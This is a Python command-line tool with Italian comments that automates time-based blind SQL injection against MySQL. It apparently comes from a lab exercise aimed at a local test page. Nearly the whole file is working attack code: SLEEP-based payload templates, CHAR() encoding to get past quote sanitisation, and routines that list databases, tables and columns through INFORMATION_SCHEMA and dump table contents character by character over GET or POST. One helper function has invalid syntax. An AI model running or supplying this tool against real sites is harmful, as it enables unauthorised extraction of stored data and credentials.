import requests
import datetime
import numpy as np
#import binascii

#Usando python bisogna ricordarsi di convertire tutti gli indici usati come interi in str prima di concatenarli

isGet = True

#payload base
#http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com

#
#    templates[0].format("boh", "bbb") -> "cabbbio boh"
#    "ca{1}io {0}".format("boh", "bbb") -> "cabbbio boh"
#    templates = ["table='{1}' {0}", "table={1} {0}"]

# format(sleeptime, column_name, tabledb_name, row, underscores)
templatesLength = [
    "\' AND (SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4}) -- -",
    "\' OR (SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4}) -- -",
    "(SELECT SLEEP({0}) FROM dual WHERE (SELECT {1} FROM {2} LIMIT {3}, 1) LIKE {4})"
]

#format(column_name, tabledb_name, row, pos+1, char, sleeptime)
templatesCell = [
    "\' AND IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))-- -",
    "\' OR IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))-- -",
    "IF(ORD(MID((SELECT {0} FROM {1} LIMIT {2}, 1),{3} , 1))={4}, SLEEP({5}), SLEEP(0))"
]

#format(tabledb_name, char, sleeptime)
templatesNumRows = [
    "\' AND IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0)) -- -",
    "\' OR IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0)) -- -",
    "IF((SELECT COUNT(*) FROM {0})={1}, SLEEP({2}), SLEEP(0))"
]

#format(sleeptime)
templatesTest = [
    "\' AND SLEEP({0}) -- -",
    "\' OR SLEEP({0}) -- -",
    "SLEEP({0})"
]

def trovaindicetemplate (url, sleeptime):
    for i in range (0, len(templatesTest)):
        payload = templatesTest.format(sleeptime)
        payload2 = "shishkebbab"
        if(request(url, payload, sleeptime) || request(url,payload2,sleeptime)):
            return i


#Trova il valore di una cella di una tabella, dopo aver trovato il DB, la tabella e la colonna.
def findCellValue(url, tabledb_name, row, column_name, sleeptime):
    print("findCellValue length")
    len=0
    undersc = []  #Vettore di caratteri underscore
    concatList = ["CHAR(", "95"]
    for i in range(1, 50):
        undersc.append('_')

        #Essendo che gli ' sono sanitizzati, si aggira il problema convertendo il valore dell'undescore
        #in decimale usando la funzione CHAR e lo concateno alla query
        #______ con CONCAT 
        concatStr="".join(concatList) + ")"
        concatList.append(",95")
        
        #A seconda del comando passato eseguo le query o in metodo GET o in metodo POST
        if(isGet):
            #payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
            payload = templatesLength[0].format(sleeptime, column_name, tabledb_name, row, concatStr)
        else:
	        #TODO parametrizzare richiesta in POST
            payload={
                'to':templatesLength[2].format(sleeptime, column_name, tabledb_name, row, concatStr),
                'msg':'msg'    
	        }
            
            #to=cbdhasj&msg='vfdnj'
            #template[0].format(retval)

            #print(payload)

        #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
        if(request(url, payload, sleeptime)):
            len=i
            print(len)
            break

    print("findCellValue value")
    string = []
    for pos in range(0, len):    #posizione del carattere
        for i in range(46, 122):    #char in codifica ascii

            #Nuovamente ricontrollo con che metodo invio le query
            if(isGet):
                payload=templatesCell[0].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
            else:
                payload={
                    'to':templatesCell[2].format(column_name, tabledb_name, row, pos+1, i, sleeptime),
                    'msg':'msg'
                }

            #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
            if(request(url, payload, sleeptime)):
                string.append(chr(i))
                print(string)
                break

    
    return ''.join(string) #Compatto tutti i caratteri

#Trova numero delle righe di una tabella
def findNumRows(url, tabledb_name, sleeptime):
    print("findNumRows")
    numrows=0
    for i in range(1, 100):
        if(isGet):
            payload = templatesNumRows[0].format(tabledb_name, i, sleeptime)
        else:
            payload={
                'to':templatesNumRows[2].format(tabledb_name, i, sleeptime),
                'msg':'cdef'
            }

        #print(payload)
        #Quando la query va a buon fine, salvo il numero di righe trovate e esco dal ciclo
        if(request(url, payload, sleeptime)):
            numrows=i
            break

    print(numrows)
    return numrows

#Effettua la richiesta al sito per la ricerca dei valori/db/tabelle
def request(url, payload, sleeptime):   #sleeptime deriva da calcRitardo
    elapsed = requestTime(url, payload) #elapsed deriva da requestTime
    #print(elapsed) #funz tempo richiesta

    #Ritorna T/F, confronto il tempo di risposta con un'oggetto tempo dai noi creato
    return elapsed > datetime.timedelta(seconds=sleeptime)

#Effettua una richiesta e ritorna il tempo di risposta  
def requestTime(url, payload):
    #costruire il payload
    #inviare richiesta a server
    #ans = requests.get('http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com\' AND SLEEP(1)-- -')

    #Ans è un'oggetto della risposta alla richiesta che, tra gli altri, contiene il tempo di risposta che a noi serve
    if(isGet):
        ans = requests.get(url + payload)
    else:
        #richiesta in post
        ans = requests.post(url, data=payload)
    #print(ans)
    #print(ans.content)
    return ans.elapsed #funz tempo richiesta

#Ritorna i nomi delle colonne
def findColumnNames(url, dbname, tablename, sleeptime):
    cols = []
    numCols = findNumRows(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), sleeptime)
    for i in range(0, numCols):
        cols.append(findCellValue(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), i, "column_name", sleeptime))    
    return cols
    

#stampa i nomi delle tabelle
def findTableNames(url, dbname, sleeptime):
    numTbls = findNumRows(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), sleeptime)
    print(numTbls)
    for i in range(0, numTbls):
        print(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", sleeptime))

#stampa i nomi dei db
def findDbNames(url, sleeptime):
    numDbs = findNumRows(url, "INFORMATION_SCHEMA.SCHEMATA", sleeptime)
    for i in range(0, numDbs):
        print(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", sleeptime))
    
#stampa il contenuto di una tabella
def findTableContent(url, dbname, tablename, columns, sleeptime):
    numrows=findNumRows(url, tablename, sleeptime)
    for temp in range(0, numrows):
        tempRow=[]
        for column_name in columns:
            tempRow.append(findCellValue(url, dbname+"."+tablename, temp, column_name, sleeptime))
        print(tempRow)


def convertToChar(string):
    concatList = ["CHAR("]
    stringV = list(string)

    concatList.append(str(ord(stringV[0])))

    for c in range(1, len(stringV)):
        concatList.append("," + str(ord(stringV[c])))

    return "".join(concatList) + ")"


def calcRitardo(url):
    print("CalcRitardo")
    #dichiarazione array con libreria numpy (gestione avanzata di array e numeri)
    times = np.array([])

    #10 richieste per test
    for i in range(0, 10):
        times = np.append(times, requestTime(url, "").total_seconds())


    #toglie due teste e due code
    times = np.delete(times, np.argmax(times))
    times = np.delete(times, np.argmax(times))
    times = np.delete(times, np.argmin(times))
    times = np.delete(times, np.argmin(times))

    print(10*np.mean(times))
    return 10*np.mean(times)

########################################

#Codice per la creazione di comandi da shell
#Iniz parser 
import argparse
parser = argparse.ArgumentParser(description="Description of prog")
# -tbl "url", db  -----> funzione che stampa tutte le tbl del db
parser.add_argument('-tbl', help='stampa tutte le tbl del db. Uso: python tool.py -tbl [URL] [Nome DB]', dest="tbl", nargs=2)

# -all "url", db , tabl -------> funzione che stampa i dati della tabella
parser.add_argument('-all', help='stampa i dati della tabella. Uso: python tool.py -all [URL] [Nome DB] [Nome Tabella]', dest="all", nargs=3)

# -db "url" -------> funzione che stampa i db
parser.add_argument('-db', help='stampa elenco dei db. Uso: python tool.py -db [URL]', dest="db", nargs=1)

# -post --- se si vuole fare le richieste con metodo POST
#parser.add_argument('--post', help='Usa metodo POST invece di GET', dest="post", const=1, default=0, nargs='?')

parser.add_argument('--post', dest='post', action='store_true', default=False)

args = parser.parse_args()

if(args.post):
    isGet = False
    #print(findNumRows(args.db[0], "INFORMATION_SCHEMA.SCHEMATA", 2))

if(args.tbl is not None):
    n=calcRitardo(args.tbl[0])
    findTableNames(args.tbl[0], args.tbl[1], n)

if(args.all is not None):
    n=calcRitardo(args.all[0])
    colNames = findColumnNames(args.all[0], args.all[1], args.all[2], n)
    print(colNames)
    findTableContent(args.all[0], args.all[1], args.all[2], colNames, n)

if(args.db is not None):
    n=calcRitardo(args.db[0])
    findDbNames(args.db[0], n)